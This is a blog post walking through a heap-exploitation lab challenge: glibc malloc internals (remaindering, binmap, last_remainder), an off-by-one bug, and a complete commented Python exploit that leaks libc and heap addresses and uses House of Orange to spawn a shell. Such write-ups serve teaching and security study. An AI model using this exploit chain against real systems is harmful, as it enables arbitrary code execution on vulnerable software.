---
layout: post
title:  "HeapLAB 1 - Off By One"
date:   2022-12-08 20:02:01 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Remaindering

This is the term for splitting one free chunk down into two, then allocating one of those parts, and the other one returned to a freelist.

For example, consider a case where only `smallbin[0x300]` contains an available free chunk. \
A `malloc(0x98)` (allocation of chunk size `0x100`) would unlink the `0x300` chunk from its freelist, split a `0x100` chunk off it, link the `remainder` of size `0x200` into the *head of the unsortedbin*, and allocate the `0x100` chunk.

### Trigger

Remaindering can occur at one of three points during `malloc` execution:

1. During allocations from the `largebins`

2. During `binmap search`

3. From a `last remainder` during `unsortedbin scanning`


### binmap

This is a bitmap representing which arena's bins may be occupied. 

The binamp resides near the end of an arena.

During binmap search, `malloc` uses the binmap to find the *next* largest, occupied bin, with respect to the *requested chunk size*. \
It then remainders the last chunk in that bin (tail). 

When a chunk isn't large enough to be remaindered by a request, and leave behind at least a minimum-size chunk (which is `0x20`), this leads to `exhausting`. 

For example, if the arena only has `0x90` chunk, requesting `0x80` will exhaust that chunk, because `0x10 < MINSIZE = 0x20`, so it would allocate the *whole 0x90 chunk*. \
This is one of the few times it is possible `malloc` would return an un-expected size. 

Note this is a lazy bitmap implementation, meaning the bit of certain bin is cleared only when `malloc` attempts to allocate from an empty bin, during `binmap search` and fails. 

The bit of bin on the `binmap` is enabled when a chunk is sorted into it, during an `unsortedbin scan`. 


### last remainder

If a chunk was remainded during a binmap search, and the request size was within a smallbin range, the arena's `last_remainder` is set. 

This is just a pointer to the last chunk to get remainded. 

It works in conjunction with the unsortedbin: during an unsortedbin search for a small chunk, if the search gets to the last chunk in the unsortedbin, and that chunk is the `last_remainder` chunk, than it will be remaindered again, the `last_remainder` would be updated, and the allocation would return. 

For example:

```python
chunk_A = malloc(0x1f8)   # allocates 0x200 size chunk
chunk_B = malloc(0x18)    # prevent consolidation with top chunk

free(chunk_A)             # now chunk_A is within the unsortedbin

chunk_C = malloc(0xf8)    # allocate 0x100 size chunk.        
```

The request to allocate `0x100` size chunk involved searching the unsortedbin, hence sorting the `0x200` chunk towards `smallbin[0x200]`. \ 
Then, via a `binmap search` the chunk was remainded, and returned the free chunk to the unsortedbin head. \
This `0x100` free chunk is now the `last_remainder` chunk. 


## Challenge

We are given a binary with the following `checksec`:

```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RUNPATH:  b'../.glibc/glibc_2.23'
```

While it is compiled with full mitigations-suite, `glibc == 2.23`. \
It means we can use various of techniques, for example - house of orange.

The binary leaks no addresses at all. \
Moreover - it allows calling `malloc` for up to 16 times, but doesn't allow any control of the allocated size. \
All chunks are allocated with the same size of `0x58` user data, leading to the `0x60` bin. 

This is another indication that `house of orange` is the technique we should use here - as it will allow us to set a fake file stream on certain `0x60` chunk on the heap. 

The binary also allows `freeing` a chunk by index - however there is no double free vulnerability here. 

It also allows `editing` a chunk. \
There is a check that the chunk wasn't freed, so there is no UAF bug here. 

Finally, it allows us to read the content of an allocated chunk (doesn't work for `freed` chunks).

A very cool trick to trace the internal functions used by Malloc at glibc, is by executing the binary via: `ltrace -e \*alloc ./one_byte`. \ 
We can see allocations are performed via `calloc(1, 0x58)`. \
It means chunks are initialized to zero, hence mitigated against "reuse attacks". 


### Bug

The bug is an off-by-one byte on the heap. \
For example, overwriting the LSB of the top chunk `size`:

```bash
pwndbg> vis

0x555555603000  0x0000000000000000      0x0000000000000061      ........a.......
0x555555603010  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x555555603020  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x555555603030  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x555555603040  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x555555603050  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x555555603060  0x4141414141414141      0x0000000000020f41      AAAAAAAAA.......
```

It means not only we can fake the `size` of the succeeding chunk, but we can also corrupt its `flags`. \
For example, disabling the `PREV_INUSE` bit - treating the current chunk as a free. 


### Exploit

POC of getting a shell, via off-by-one vulnerability. \
This exploit first leaks libc and heap addresses, then uses `House of Orange` technique to get a shell. 

```python
############# LEAK LIBC ##################
# Request a chunk.
chunk_A = malloc()
# Victim chunk, whom size will be corrupted
chunk_B = malloc()
# Extra allocation, so we will have heap metadata right after chunk_B
chunk_C = malloc()
# My goal in this code snippetis to set an unsorted chunk of arbitrary length (0x90) to the unsortedbin.
#
# Because of libc mitigations, we first have to make sure the "succeeding chunk" after it, chunk_C, contains its PREV_INUSE bit set. 
# Thats why I've overwrite chunk_C first.
# However, since chunk_B is faked to seem larger, it actually thinks its succeeding chunk starts at extra offset of (0x90-0x60). 
# Also Note that in order to also avoid forward consolidation with our offseted-chunk_C, we have to set chunk_C "succeeding chunk" PREV_INUSE to 1. 
# It can be achieved by setting C fake size to 0x21, and filling at offset 0x20 a quadword that has LSB of 1.
new_chunk_B_size = 0x91
chunk_C_padding = ((new_chunk_B_size & 0xfffffff0) - 0x60) - 0x10
fake_prev_size = new_chunk_B_size
fake_size = 0x21
fake_fd = b"C" * 8
fake_bk = b"C" * 8
fake_next_chunk_prev_size = p64(0)
fake_next_chunk_size = p64(0x21)
edit(chunk_C, b"C" * chunk_C_padding + p64(fake_prev_size) + p64(fake_size) + fake_fd + fake_bk + fake_next_chunk_prev_size + fake_next_chunk_size)
# Now edit chunk A with the off-by-one vuln. 
# This extra byte is the size of chunk_B, hence treating chunk_B as an unsortedbin candidate.
# Note the PREV_SIZE field of chunk B must be some low value to pass bad chunk size mitigation. I've set it to 0x60 so it will make sense with chunk_A.
edit(chunk_A, b"A" * 0x50 + p64(0x60) + p64(new_chunk_B_size))  # only the LSB is overflowed
# Free B, so it is moved to the unsortedbin as a 0x90 chunk
free(chunk_B)

# My goal in this code is to remainder the fake 0x90 unsorted chunk into smaller, 0x30 size chunk.
# This free small chunk would be part of the unsorted bin initially, on a next malloc() call it will move to its smallbin. 
# The remainder chunk would reside within the same memory space as another allocated chunk - chunk_C.
# Because unsortedbins store fd and bk metadata, that initially points towards the unsortedbin address at the arena - we have an arena address leak. 
# For the case of main_arena, this is a libc leak. 

# Allocate 0x60 chunk. The allocation would be made from the 0x90 free chunk.
# During the allocation, the unsortedbin (that currently only has a 0x90 chunk) would be scanned.
# The chunk would move to the smallbin[0x90] via partial unlinking.
# Afterwards, the chunk would be remainded during the binmap search of the 0x90 smallbin.
# Then, it would return the 0x60 part to the caller, while having a free chunk of 0x30 as the last remainder - which is moved to the unsortedbin head. 
# This chunk is repurposed as chunk_C, as the real size of chunk B is only 0x60 bytes, not 0x90. 
chunk_D = malloc()
# Leak its content, starting with fd and bk of the unsorted chunk 0x30
data = read(chunk_C)

main_arena_leak = u64(data[:8]) - 0x58
libc.address = main_arena_leak - libc.sym.main_arena
info(f"libc leak:{hex(libc.address)}")

# Tweak the fake chunk to size 0x50, so it will be mapped to the 0x50 smallbin. 
# Note it is still within the unsortedbin. Only at the next call to malloc it will be moved to the smallbin[0x50].
edit(chunk_D, b"D" * 0x50 + b"/bin/sh\x00" + b"\x51")

################# LEAK HEAP ######################

# This code snippet is just a reflection of the above. 
# Note however, that in order to leak heap address instead of arena address, i've linked two chunks within the smallbin[0x50].
# That way, the head chunk of that bin contains pointers to the previously-added chunk - which are heap pointers. 

chunk_A_r = malloc()
chunk_B_r = malloc()
chunk_C_r = malloc()

write_ptr = 2
write_base = 1

edit(chunk_C_r, b"C" * (chunk_C_padding - 16) + p64(write_base) + p64(write_ptr) + p64(fake_prev_size) + p64(fake_size) + fake_fd + fake_bk + fake_next_chunk_prev_size + fake_next_chunk_size)
edit(chunk_A_r, b"A" * 0x50 + p64(0x60) + p64(new_chunk_B_size))

free(chunk_B_r)

chunk_D_r = malloc()

# Tweak the fake chunk to size 0x50, so it will be mapped to the 0x50 smallbin
edit(chunk_D_r, b"D" * 0x50 + b"/bin/sh\x00" + b"\x51")

# Put the 0x50 chunk inside the 0x50 smallbin. 
# Now it should be the head of that smallbin, hence contains two pointers to the smallbin chunk allocated at the prior stage. 
chunk_E_r = malloc()

data = read(chunk_C_r)
heap_leak = u64(data[:8]) - 0xc0

info(f"heap leak:{hex(heap_leak)}")

######################### HOUSE OF ORANGE ########################

# Now that i got leaks, i can perform house of orange.
# My goal is to craft a chunk that resides at the unsortedbin, and would move to the smallbin[0x60] during the next malloc call. 
chunk_A_rr = malloc()
chunk_B_rr = malloc()
chunk_C_rr = malloc()
chunk_E_rr = malloc()
chunk_F_rr = malloc()

# Like before, prepare chunk_B for fake size of 0x91
edit(chunk_C_rr, b"C" * chunk_C_padding + p64(fake_prev_size) + p64(fake_size) + fake_fd + fake_bk + fake_next_chunk_prev_size + fake_next_chunk_size)
edit(chunk_A_rr, b"A" * 0x50 + p64(0x60) + p64(new_chunk_B_size))

# Get a fresh 0x90 chunk within the unsortedbin
free(chunk_B_rr)

# remaindering, move the 0x30 chunk to the unsortedbin
chunk_D_rr = malloc()

# Overwrite the fake chunk to size 0x69, so it will be mapped to the 0x60 smallbin at the next malloc.
# Note that the binary only allows allocations of 0x60 chunks. 
# The trick is to set its size to 0x69, so it is considered as 0x68 != 0x60, and being sorted into the smallbin instead of allocated from the unsortedbin. 
# Also note that i've set "/bin/sh\x00" here, because the fake file stream points exactly to the chunk start. 
# Since IO_OVERFLOW calls fp->overflow(fp, BLA) - it uses the current file stream pointer as its first argument. 
# By setting the first 8 bytes like so, fp is a pointer to "/bin/sh" string. 
edit(chunk_D_rr, b"D" * 0x50 + b"/bin/sh\x00" + b"\x69")

# I have to keep crafting the fake _IO_FILE_plus struct (started by overwriting the "flags" with /bin/sh)
# Recall that chunks E and F are contigious in memory to chunk C. 
# This will make sure _IO_list_all would be overwritten with the unsortedbin arena address. 
# In order to pass the IO_OVERFLOW conditions, i have to pass write_base(1) < write_ptr(2).
new_fd = 0
new_bk = libc.sym._IO_list_all - 0x10
edit(chunk_C_rr, p64(new_fd) + p64(new_bk) + p64(1) + p64(2))

# Point the vtable of the stream to an heap address, contains many function pointers of system(). 
# In particular, vtable->__overflow points to system(). 
vtable_ptr = heap_leak + 0x440
overflow = libc.sym.system
# I want to make sure mode == -1 < 0 so the IO_OVERFLOW condition pass
edit(chunk_E_rr, b"\xff" * 0x58) 
edit(chunk_F_rr, p64(vtable_ptr) * 2 + p64(overflow) * 9)
# Trigger partial unlink of the unsorted bin chunk 0x69.
# Because it wont match the exact-fit allocation criteria, it will be sorted to a smallbin. 
# This will also overwrite _IO_list_all with an arena address.
# Since the unsortedbin would continue, but the unsortedbin->bk is now corrupted with our new_bk, abort() would be called.
# abort() flushes IO streams, so it will try to flush the fake stream located at the main arena (as _IO_list_all points to), and fail because of the misproper IO_OVERFLOW conditions.
# It will then follow the _chain member of this fake arena stream, which is the content of smallbin[0x60], and treat it as the next _IO_FILE_plus.
# This time the IO_OVERFLOW conditions are met, so chunk.vtable->__overflow(fp, BLA) is called - triggering call to system("/bin/sh\x00").
malloc()
```

There are many caveats and tricks with this exploitation - all documented within the code. 

Note that in order to overcome the `smallbin[0x60]` requirement of house of orange (on an harsh case when we can only make 0x60 allocations) - it is also possible to set the special value of `0xb0`. 

In case an exact fit occurs for the unsorted chunk 0x60, unlink would still happen - but the search would stop. 

It means that `_IO_list_all` is still overwritten with the arena address, and its `_chain` pointer still points toward the `0x60` smallbin. 

However, since this smallbin is now empty - its `fd, bk` pointers are initialized to point to some arena address. 

This in turn, would lead to a `_chain` at a another arena address - this time corresponds to the bin of `0xb0`. 
